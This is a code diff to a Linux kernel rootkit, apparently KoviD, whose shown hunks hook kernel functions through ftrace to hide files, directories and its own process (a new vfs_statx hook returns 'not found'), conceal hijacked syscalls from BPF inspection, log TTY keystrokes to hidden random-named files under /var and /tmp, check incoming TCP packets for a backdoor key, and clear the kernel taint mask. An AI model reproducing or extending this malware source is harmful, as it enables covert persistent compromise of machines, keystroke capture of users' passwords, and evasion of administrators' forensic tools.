@@ -19,6 +19,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
+#include "log.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 
@@ -294,7 +295,7 @@ static asmlinkage long m_read(struct pt_regs *regs) {
 
     arg = (const char __user*)PT_REGS_PARM2(regs);
     if (!copy_from_user((void *)buf, (void *)arg, size)) {
-        char *dest = (strstr(buf, "kovid") ||
+        char *dest = (strstr(buf, MODNAME) || strstr(buf, "kovid") ||
                 strstr(buf, "journald"));
         if (!dest)
             goto out;
@@ -445,16 +446,13 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
 
             /**
              * Now we check if value (stored syscall address)
-             * is among the ones we are hijacking
+             * is one of us
              */
             s = _get_sys_addr(*(unsigned long*)value & 0xfffffffffffffff0);
             if (s != 0UL) {
                 void *v = kmalloc(value_size, GFP_KERNEL);
                 if (v) {
-                    /**
-                     * Convert value to user ptr
-                     * and clear it
-                     */
+                    /** fetch userspace buffer and clear */
                     void __user *uvalue = u64_to_user_ptr(attr->value);
                     memset(v, 0, value_size);
 
@@ -661,7 +659,7 @@ static int m_packet_rcv(struct sk_buff *skb, struct net_device *dev,
             return 0;
         else {
             struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
-            if (kv_check_cursing(tcp))
+            if (kv_check_bdkey(tcp,skb))
                 return 0;
         }
     }
@@ -682,7 +680,7 @@ static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
             return 0;
         else {
             struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
-            if (kv_check_cursing(tcp))
+            if (kv_check_bdkey(tcp,skb))
                 return 0;
         }
     }
@@ -728,16 +726,26 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
     return real_audit_log_start(ctx, gfp_mask, type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,1,0)
+static bool  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
+static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#else
 static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#endif
 
     if (fs_search_name(name, ino))
         return 0;
     return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,1,0)
+static bool  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
+static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#else
 static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
 static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+#endif
 
     if (fs_search_name(name, ino))
         return 0;
@@ -864,7 +872,7 @@ void _keylog_cleanup(void) {
 
     _keylog_cleanup_list();
     fs_kernel_close_file(ttyfilp);
-    fs_file_rm(sys_ttyfile());
+    fs_file_rm(sys_get_ttyfile());
 
     ttyfilp = NULL;
 }
@@ -897,6 +905,13 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
         if (copy_from_user(ttybuf, buf, rv))
+            goto out;
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
+        struct iovec *iov = iter_iov(to);
+        if (!iov || !iov->iov_base)
+            goto out;
+
+        if (copy_from_user(ttybuf, iov->iov_base, rv))
             goto out;
 #else
         if (!to->iov || !to->iov->iov_base)
@@ -982,6 +997,22 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
     return fregs;
 }
 #endif
+
+static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
+static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
+    /** size is more than enough for what is needed here. */
+    char kernbuf[PROCNAME_MAXLEN+6] = {0};
+
+    if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
+
+        /** we don't exist */
+        if (strstr(kernbuf, PROCNAME))
+            return -ENOENT;
+    }
+
+    /** return normal */
+    return real_vfs_statx(dfd, filename, flags, stat, request_mask);
+}
 
 /**
  * __x64 prefix is not always present
@@ -1117,7 +1148,6 @@ struct kernel_syscalls *kv_kall_load_addr(void) {
         /** zero tainted_mask for the bits we care */
         ks.tainted = (unsigned long*)ks.k_kallsyms_lookup_name("tainted_mask");
 
-
         ks.k__set_task_comm = (do__set_task_comm_sg)ks.k_kallsyms_lookup_name("__set_task_comm");
         if (!ks.k__set_task_comm)
             prwarn("invalid data: __set_task_comm will not work\n");
@@ -1144,6 +1174,8 @@ static struct ftrace_hook ft_hooks[] = {
     {"filldir64", m_filldir64, &real_filldir64},
     {"tty_read", m_tty_read, &real_tty_read},
     {"proc_dointvec", m_proc_dointvec, &real_proc_dointvec},
+    {"vfs_statx", m_vfs_statx, &real_vfs_statx},
+
     {NULL, NULL, NULL},
 };
 
@@ -1213,66 +1245,60 @@ void fh_remove_hooks(struct ftrace_hook *hooks) {
     }
 }
 
-static char *_sys_file(const char *prefix, char *file, int max) {
-    int prefix_len, rand_len;
+struct sysfiles_t {
+    char ttyfile[PATH_MAX];
+    char sslfile[PATH_MAX];
+};
+static struct sysfiles_t sysfiles;
+static bool _sys_file_init(int ttymax, int sslmax) {
     bool rc = false;
 
-    if (file && prefix) {
+    if (ttymax > 0 && sslmax > 0) {
 
-        prefix_len = strlen(prefix);
-        rand_len = max - prefix_len - 1; /** for '\0' */
+        char *tty = kv_util_random_AZ_string(ttymax);
+        char *ssl = kv_util_random_AZ_string(sslmax);
 
-        if (rand_len > 0) {
-            char *rand_buf = kv_util_random_AZ_string(rand_len);
-
-            if (rand_buf) {
-                snprintf(file, max, "%s%s", prefix, rand_buf);
-                kfree(rand_buf);
-                rc = true;
-            }
+        if (tty && ssl) {
+            snprintf(sysfiles.ttyfile,
+                    sizeof(sysfiles.ttyfile)-1, "/var/.%s", tty);
+            snprintf(sysfiles.sslfile,
+                    sizeof(sysfiles.sslfile)-1, "/tmp/.%s", ssl);
+            kv_mem_free(&tty, &ssl);
+            rc = true;
         }
     }
-    return rc ? file : NULL;
+    return rc;
 }
 
-char *sys_ttyfile(void) {
-    static char file[32] = {0};
-    if (*file == 0) {
-        if (_sys_file("/var/.", file, 31)) {
-            const char *var[] = {file, NULL};
-            fs_add_name_ro(var,0);
-        }
-    }
-    return file;
+char *sys_get_ttyfile(void) {
+    return sysfiles.ttyfile;
 }
-
-char *sys_sslfile(void) {
-    static char file[32] = {0};
-    if (*file == 0) {
-        if (_sys_file("/tmp/.", file, 31)) {
-            const char *tmp[] = {file, NULL};
-            fs_add_name_ro(tmp,0);
-        }
-    }
-    return file;
+char *sys_get_sslfile(void) {
+    return sysfiles.sslfile;
 }
 
 bool sys_init(void) {
     int idx = 0, rc = false;
-    char *ttyfile = sys_ttyfile();
 
-    if (ttyfile) {
-        /** XXX: init hooks - negate so we're consistent with other inits */
-        rc = !fh_install_hooks(ft_hooks);
-        if (rc) {
-            for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
-                prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+    if (_sys_file_init(64, 64)) {
+        char *tty = strrchr(sys_get_ttyfile(), '.');
+        char *ssl = strrchr(sys_get_sslfile(), '.');
+        const char *files_to_hide[] = {tty, ssl, NULL};
 
-            /** Init tty log */
-            ttyfilp = fs_kernel_open_file(ttyfile);
-            if (!ttyfilp) {
-                prerr("Failed loading tty file\n");
-                rc = false;
+        /** init fist a couple of hidden files */
+        if (tty && ssl && fs_add_name_ro(files_to_hide, 0) == 0) {
+
+            rc = !fh_install_hooks(ft_hooks);
+            if (rc) {
+                for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
+                    prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
+
+                /** Init tty log */
+                ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
+                if (!ttyfilp) {
+                    prerr("Failed loading tty file\n");
+                    rc = false;
+                }
             }
         }
     }
@@ -1283,7 +1309,7 @@ void sys_deinit(void) {
     struct sys_addr_list *sl, *sl_safe;
 
     fh_remove_hooks(ft_hooks);
-    fs_file_rm(sys_sslfile());
+    fs_file_rm(sys_get_sslfile());
     _keylog_cleanup();
 
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
